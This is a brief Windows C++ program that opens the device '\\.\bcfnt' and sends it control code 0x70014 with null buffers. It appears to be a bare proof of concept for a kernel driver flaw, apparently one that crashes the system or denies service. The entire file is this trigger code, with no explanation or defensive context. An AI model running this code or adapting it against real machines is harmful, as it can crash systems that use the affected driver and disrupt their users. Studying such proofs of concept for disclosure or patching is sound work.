#include "stdafx.h"
#include <windows.h>
#include <winioctl.h>
#include <iostream>

int main()
{
	HANDLE hDevice;
	DWORD d;

	hDevice = CreateFileW(L"\\\\.\\bcfnt", 	0, FILE_SHARE_READ | FILE_SHARE_WRITE,	NULL, OPEN_EXISTING, 0, NULL); 

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "Can't open" << std::endl;
		return (FALSE);
	}

	DeviceIoControl(hDevice,	0x70014, NULL, 0, NULL, 0, &d, (LPOVERLAPPED)NULL);
	CloseHandle(hDevice);
}

